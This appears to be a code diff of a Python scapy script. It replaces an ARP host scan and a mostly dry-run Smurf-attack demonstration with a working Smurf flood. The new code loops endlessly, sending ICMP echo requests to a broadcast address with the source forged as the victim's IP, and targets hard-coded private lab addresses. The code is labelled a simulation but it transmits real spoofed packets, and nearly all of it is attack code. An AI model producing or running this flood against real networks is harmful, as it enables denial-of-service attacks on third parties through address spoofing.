@@ -1,48 +1,25 @@
-import ipaddress
+import time
 
-from scapy.layers.inet import ICMP
-from telnetlib import IP
-
-from scapy.layers.l2 import ARP, Ether
-from scapy.sendrecv import srp, send
+from scapy.layers.inet import IP, ICMP
+from scapy.sendrecv import send
 
 
-def scan_network(network_range="192.168.56.0/24"):
+def smurf_flood(victim_ip, broadcast_ip, interval=10, count_per_batch=1):
 
-    arp_request = ARP(pdst=network_range)
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-
-    answered, unanswered = srp(arp_request_broadcast, timeout=2, verbose=False)
-
-    hosts = []
-    for sent, received in answered:
-        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
-
-    return hosts
+    print(f"Starting continuous Smurf simulation to victim {victim_ip} via broadcast {broadcast_ip}...\n")
+    try:
+        while True:
+            packet = IP(src=victim_ip, dst=broadcast_ip) / ICMP()
+            send(packet, count=count_per_batch, verbose=True)
+            print(f"Sent {count_per_batch} packet(s) to broadcast. Waiting {interval} seconds...\n")
+            time.sleep(interval)
+    except KeyboardInterrupt:
+        print("\nSimulation stopped by user.")
 
 
-local_ip = "192.168.8.1"
-netmask = "255.255.255.0"
+if __name__ == "__main__":
 
-def smurf_simulation(victim_ip, network_range="192.168.8.0/24", real_send=False):
-    hosts = scan_network(network_range)
-    print(f"\nDiscovered hosts in {network_range}: {hosts}")
+    victim_ip = "192.168.56.5"
+    broadcast_ip="192.168.56.255"
 
-    print(f"\n[SIMULATION] Attacker sends spoofed ICMP requests to broadcast, "
-          f"pretending to be {victim_ip}\n")
-
-    for host in hosts:
-        if host != victim_ip:
-            packet = IP(src=victim_ip, dst=host)/ICMP()
-            print(f"Host {host} would reply to victim {victim_ip}")
-
-            if real_send:
-                send(packet, verbose=False)
-
-    print("\nSimulation complete: victim receives ICMP flood from all hosts.")
-
-
-network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
-broadcast_ip = str(network.broadcast_address)
-print("Broadcast IP:", broadcast_ip)
+    smurf_flood(victim_ip, broadcast_ip, interval=10, count_per_batch=1)
